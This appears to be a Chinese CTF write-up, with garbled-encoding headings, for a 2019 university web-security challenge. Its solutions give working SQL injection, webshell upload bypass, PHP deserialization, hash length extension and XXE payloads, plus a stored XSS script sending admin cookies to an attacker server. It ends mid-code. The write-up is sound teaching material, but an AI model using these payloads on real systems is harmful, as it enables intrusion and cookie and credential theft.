<h2 id="Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼"><a href="#Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼" class="headerlink" title="Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼"></a>Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼</h2><p>ç»è¿‡æµ‹è¯•ä¸€äº›å…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œä½†é€šè¿‡åŒå†™å¯ä»¥ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=-1&apos; oorrder bbyy 4-- &amp;password=123 //åˆ¤æ–­å­—æ®µ</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(schema_name)+frfromom+infoorrmation_schema.schemata%23&amp;password=123 //æŸ¥æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema%3d&apos;geek&apos;%23&amp;password=123  //æŸ¥è¡¨</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_schema%3d&apos;geek&apos;+aandnd+table_name%3d&apos;b4bsql&apos;%23&amp;password=123 //æŸ¥å­—æ®µ</span><br><span class="line"></span><br><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123   //è·å–æ•°æ®</span><br></pre></td></tr></table></figure>

<h2 id="ç¥ç§˜çš„ä¸‰å¶è‰"><a href="#ç¥ç§˜çš„ä¸‰å¶è‰" class="headerlink" title="ç¥ç§˜çš„ä¸‰å¶è‰"></a>ç¥ç§˜çš„ä¸‰å¶è‰</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029215131113.png" alt="image-20191029215131113"></p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°Secret.php</p>
<p>æ‰“å¼€Secret.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029215545399.png" alt="image-20191029215545399"></p>
<p>ç›´æ¥BPæŠ“åŒ…ï¼Œä¿®æ”¹Refererå¤´</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029220046452.png" alt="image-20191029220046452"></p>
<p>æç¤ºä½¿ç”¨Sycloveræµè§ˆå™¨</p>
<p>ä¿®æ”¹UAå¤´</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029220217949.png" alt="image-20191029220217949"></p>
<p>æ¥ç€æç¤ºåªèƒ½æœ¬åœ°è¯»å–</p>
<p>ä¿®æ”¹XFFå¤´</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029220337766.png" alt="image-20191029220337766"></p>
<p>å¾—åˆ°flag</p>
<h2 id="Eval-evil-code-Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚"><a href="#Eval-evil-code-Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚" class="headerlink" title="Eval evil code: Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚"></a>Eval evil code: Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚</h2><p>è¿™é‡Œæœ‰ä¸¤ä¸ªé™åˆ¶</p>
<p>ä¸€ã€æäº¤çš„æ¶æ„ä»£ç ä¸èƒ½å¸¦æœ‰å‚æ•°ï¼ŒäºŒã€è¾“å…¥æ­£ç¡®çš„éªŒè¯ç </p>
<p>ç¬¬äºŒä¸ªå¥½è§£å†³ï¼Œç›´æ¥ç”¨md5<a href="https://0xcreed.github.io/2019/11/04/Md5Crack/" target="_blank" rel="noopener">ç¢°æ’è„šæœ¬</a></p>
<p>ç¬¬ä¸€ä¸ªå°±è¦åˆ©ç”¨PHPçš„ä¸°å¯Œçš„å†…ç½®å‡½æ•°æ¥æ„é€ å‚æ•°ã€‚</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191111224322216.png" alt="image-20191111224322216"></p>
<p>æ¥ç€è¯»å–readflag.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191111224528382.png" alt="image-20191111224528382"></p>
<p>å‚è€ƒskysecçš„<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">æ–‡ç« </a></p>
<h2 id="Jiangâ€˜s-Secret-æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼"><a href="#Jiangâ€˜s-Secret-æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼" class="headerlink" title="Jiangâ€˜s Secret:æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼"></a>Jiangâ€˜s Secret:æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼</h2><p>æ‰“å¼€ä¸»é¡µ</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231444787.png" alt="image-20191029231444787"></p>
<p>æŸ¥çœ‹æºç </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231426639.png" alt="image-20191029231426639"></p>
<p>è®¿é—®Archive_room.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231626206.png" alt="image-20191029231626206"></p>
<p>ç‚¹å‡»SECRET</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231659829.png" alt="image-20191029231659829"></p>
<p>å°è¯•BPæŠ“åŒ…</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231743833.png" alt="image-20191029231743833"></p>
<p>è®¿é—®secr3t.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029231920584.png" alt="image-20191029231920584"></p>
<p>ç®€å•çš„ä»£ç å®¡è®¡</p>
<p>ç›´æ¥file=flag.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029232108090.png" alt="image-20191029232108090"></p>
<p>æ— æ³•ç›´æ¥è¯»å–flag.phpæ–‡ä»¶</p>
<p>åˆ©ç”¨phpä¼ªåè®®</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029232338502.png" alt="image-20191029232338502"></p>
<p>base64è§£ç </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191029232357758.png" alt="image-20191029232357758"></p>
<h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><h2 id="ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ"><a href="#ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ" class="headerlink" title="ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ=="></a>ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ==</h2><p>ä¸Šä¼ æ­£å¸¸çš„å›¾ç‰‡</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030232940824.png" alt="image-20191030232940824"></p>
<p>Not imageï¼</p>
<p>å°è¯•ä¿®æ”¹Content-Type</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233157391.png" alt="image-20191030233157391"></p>
<p>ä¸Šä¼ æˆåŠŸï¼Œä½†å¹¶æ²¡æœ‰è¿”å›æ–‡ä»¶è·¯å¾„</p>
<p>ç›²çŒœä¸€æ³¢upload</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233348553.png" alt="image-20191030233348553"></p>
<p>æ­£ç¡®</p>
<p>å°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233555540.png" alt="image-20191030233555540"></p>
<p>å°è¯•æ”¹åç¼€</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233648512.png" alt="image-20191030233648512"></p>
<p>phtmlå¯ç»•è¿‡ ä½†ä¸èƒ½å‡ºç°&lt;?</p>
<p>åˆ©ç”¨  <code>&lt;script  language=&quot;php&quot;&gt;</code> ç»•è¿‡</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030233844611.png" alt="image-20191030233844611"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p>èœåˆ€ è¿ä¸Š</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030234008757.png" alt="image-20191030234008757"></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191030234111964.png" alt="image-20191030234111964"></p>
<h2 id="Leixiaoâ€™s-blog-ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ"><a href="#Leixiaoâ€™s-blog-ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ" class="headerlink" title="Leixiaoâ€™s blog:  ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ"></a>Leixiaoâ€™s blog:  ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ</h2><p>è¿™é“é¢˜æ˜¯ç›´æ¥æ ¹æ®wpå¤ç°çš„ï¼Œå¯¹XSSæ²¡æœ‰å®æˆ˜è¿‡ï¼Œæ‰€ä»¥æ²¡å†™å‡ºæ¥ã€‚</p>
<p>XSSç¦»ä¸å¼€è¾“å…¥æ¡†ï¼Œæ‰€ä»¥BPæŠ“åŒ…ï¼Œä¿®æ”¹å„ä¸ªå‚æ•°çš„å€¼ï¼Œå‘ç°å¯†ä¿é—®é¢˜æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å°±æ„é€ ä¸€ä¸ªScriptçš„è¯­å¥ï¼Œæ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œä¹‹ååœ¨é‡ç½®å¯†ç é¡µé¢ï¼Œè¿™ä¸ªScriptè¯­å¥ä¼šæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¦‚æœç®¡ç†å‘˜è®¿é—®äº†è¿™ä¸ªé¡µé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¾—åˆ°ç®¡ç†å‘˜çš„cookieï¼Œä»è€Œä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ã€‚</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶å°†å¯†ä¿é—®é¢˜ä¿®æ”¹æˆScriptè¯­å¥ <code>&quot;&gt;&lt;script src=//0x12345678/1.js&gt;</code></p>
<p>1.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.location=<span class="string">'http://vps_ip/cookie'</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191117232732259.png" alt="image-20191117232732259"></p>
<p>æˆ‘ä»¬è®¿é—®dcz123ç”¨æˆ·çš„é‡ç½®å¯†ç é¡µé¢</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191117233119467.png" alt="image-20191117233119467"></p>
<p>å‘ç°æˆåŠŸè·³è½¬äº†</p>
<p>æ¥ä¸‹æ¥æŠŠ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://148.70.59.198:41258/forget.php?username=dcz123</span><br></pre></td></tr></table></figure>

<p>å‘ç»™report</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191117233239962.png" alt="image-20191117233239962"></p>
<p>ç®¡ç†å‘˜è®¿é—®åï¼Œå°±èƒ½åœ¨è®¿é—®æ—¥å¿—ä¸­å¾—åˆ°ç®¡ç†å‘˜çš„cookieäº†</p>
<h2 id="ååºåˆ—åŒ–1-0-socre10000æ‹¿åˆ°flag"><a href="#ååºåˆ—åŒ–1-0-socre10000æ‹¿åˆ°flag" class="headerlink" title="ååºåˆ—åŒ–1.0 : socre10000æ‹¿åˆ°flag"></a>ååºåˆ—åŒ–1.0 : socre10000æ‹¿åˆ°flag</h2><p>F12æŸ¥çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct working"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;score==<span class="number">10000</span>) &#123;</span><br><span class="line">            $flag = <span class="string">"******************"</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_GET[<span class="string">'exp'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½¿scoreçš„å€¼æ”¹æˆ10000è·å¾—flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $Student = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="keyword">echo</span> serialize($Student); </span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O:7:"Student":1:&#123;s:5:"score";i:10000;&#125;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">148.70</span>.<span class="number">59.198</span>:<span class="number">42374</span>/?<span class="keyword">exp</span>=O:<span class="number">7</span>:%22Student%22:<span class="number">1</span>:&#123;<span class="keyword">s</span>:<span class="number">5</span>:%22score%22;i:<span class="number">10000</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191103221650185.png" alt="image-20191103221650185"></p>
<p><a href="https://www.freebuf.com/news/172507.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<h2 id="åˆæ¥ä¸€åªçŒ«-æˆ‘å®¶çŒ«åå­—å«php"><a href="#åˆæ¥ä¸€åªçŒ«-æˆ‘å®¶çŒ«åå­—å«php" class="headerlink" title="åˆæ¥ä¸€åªçŒ«: æˆ‘å®¶çŒ«åå­—å«php"></a>åˆæ¥ä¸€åªçŒ«: æˆ‘å®¶çŒ«åå­—å«php</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106232809806.png" alt="image-20191106232809806"></p>
<p>æ¨æµ‹åº”è¯¥å­˜åœ¨å¤‡ä»½æ–‡ä»¶ï¼Œç›²çŒœ <code>www.zip</code></p>
<p>ä¸‹è½½åè§£å‹ï¼Œindex.phpä¸­æ¥å—selectå‚æ•°å¹¶ååºåˆ—åŒ–ã€‚</p>
<p>æŸ¥çœ‹class.php</p>
<p>æ ¹æ® <code>__destruct()</code>å‡½æ•° ååºåˆ—åŒ–è¦ä½¿$username=admin,$password=100.</p>
<p>ä½†æœ‰ä¸ªé—®é¢˜è¦ç»•è¿‡ <code>__wakeup()</code> ,è¿™é‡Œå¯ä»¥åˆ©ç”¨ CVE-2016-7124æ¼æ´ï¼Œ<strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</strong> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;    </span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'100'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line">$payload=<span class="string">"O:4:\"Name\":3&#123;s:14:\"\000Name\000username\";s:5:\"admin\";s:14:\"\000Name\000password\";s:3:\"100\";&#125;"</span>; <span class="comment">//2-&gt;3</span></span><br><span class="line">var_dump(urlencode($payload));<span class="comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8109/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106234145206.png" alt="image-20191106234145206"></p>
<p><a href="https://xz.aliyun.com/t/3674#toc-11" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://xz.aliyun.com/t/6454#toc-18" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
<h2 id="ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—"><a href="#ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—" class="headerlink" title="ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—"></a>ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—</h2><p>æ‰“å¼€é¢˜ç›®<a href="http://cxc.design/53a5734d6c99f89a/" target="_blank" rel="noopener">é“¾æ¥</a></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106163009923.png" alt="image-20191106163009923"></p>
<p>F12æŸ¥çœ‹æºç </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106163100753.png" alt="image-20191106163100753"></p>
<p>æ˜æ˜¾æ˜¯hashæ‰©å±•å­—èŠ‚æ”»å‡»</p>
<p>åˆ©ç”¨BPæŠ“åŒ…</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106163553918.png" alt="image-20191106163553918"></p>
<p>å¾—åˆ°Heartçš„å€¼ï¼š<code>6a1ce5f4dc83320710006a786ac82c17</code></p>
<p>åˆ©ç”¨hashpumpå¾—åˆ°lover</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106163932674.png" alt="image-20191106163932674"></p>
<p>å°†å¾—åˆ°çš„å­—ç¬¦ä¸²è¿›è¡Œurlç¼–ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">$str=<span class="string">"syclover\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00nb"</span>;</span><br><span class="line">var_dump(urlencode($str));<span class="comment">//syclover%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B8%00%00%00%00%00%00%00nb</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†Heartçš„å€¼ä¿®æ”¹æˆ<code>2399f812e1a15732dcaadef365b71c19</code> æäº¤lover</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106164815760.png" alt="image-20191106164815760"></p>
<p>åé¢çœ‹äº†LiMçš„æ–‡ç« ï¼Œæ¯äº†ã€‚</p>
<p>åŒURLç¼–ç ç»•è¿‡ï¼Œç›´æ¥POSTæäº¤  <code>lover=syclove%2572</code> å¾—åˆ°flagã€‚</p>
<p>æ€è·¯å¤ªå±€é™äº†ã€‚ã€‚ã€‚</p>
<p><a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://www.freebuf.com/articles/database/164019.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
<h2 id="Finalsql"><a href="#Finalsql" class="headerlink" title="Finalsql"></a>Finalsql</h2><h2 id="ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å—-xxe"><a href="#ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å—-xxe" class="headerlink" title="ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å— : xxe"></a>ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å— : xxe</h2><p>éƒ½å·²ç»æç¤ºxxeäº†</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191112171229906.png" alt="image-20191112171229906"></p>
<p>åˆ©ç”¨phpä¼ªåè®®è¯»å–æºç </p>
<p>index.phpä¸­çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./config.php"</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">"PRC"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $data= $_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/flag|decode|file|zlib|input|data|http|ftp|#/i"</span>,$data))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"no!!!you cant read flag right here!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $xml = simplexml_load_string($data,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>($xml);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°åŒ…å«äº†configæ–‡ä»¶</p>
<p>æ¥ç€è¯»</p>
<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $filetype;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"wake up "</span>;</span><br><span class="line">        var_dump(readfile(<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($filetype,$filename)</span></span>&#123;</span><br><span class="line">    	$filename = $filename;</span><br><span class="line">    	$filetype = $filetype;</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">if</span> (($filetype!=<span class="string">"image/jpg"</span>)&amp;&amp;(substr($filename, strrpos($filename, <span class="string">'.'</span>)+<span class="number">1</span>))!= <span class="string">'jpg'</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"åªå…è®¸ä¸Šä¼ jpgæ ¼å¼æ–‡ä»¶"</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filetemp)</span></span>&#123;</span><br><span class="line">    $target_file=getcwd().<span class="string">"/uploads/"</span>.md5($filetemp+$_SERVER[<span class="string">'HTTP_REFERER'</span>]).<span class="string">".jpg"</span>;</span><br><span class="line">    $handle = fopen($filetemp, <span class="string">"r"</span>);</span><br><span class="line">    $content = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof($handle))&#123;</span><br><span class="line">        $content .= fread($handle, <span class="number">8080</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/xml|#|SYSTEM|DOCTYPE|fliter|uploads|www/i"</span>,$content))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Invalid file!!!!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">    fclose($handle);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($filetemp, $target_file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"your file is here:"</span>.$target_file;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†index.phpå¹¶æ²¡æœ‰æŠŠFileç±»å®ä¾‹åŒ–ã€‚Fileç±»ä¸­æœ‰ä¸Šä¼ åŠŸèƒ½çš„å‡½æ•°ï¼Œå°±çŒœäº†ä¸‹upload.php ã€‚è¿˜çœŸæœ‰ã€‚ã€‚ã€‚</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191112234259635.png" alt="image-20191112234259635"></p>
<p>è¯»å–upload.phpçš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">$filetype = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">$filetemp = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span 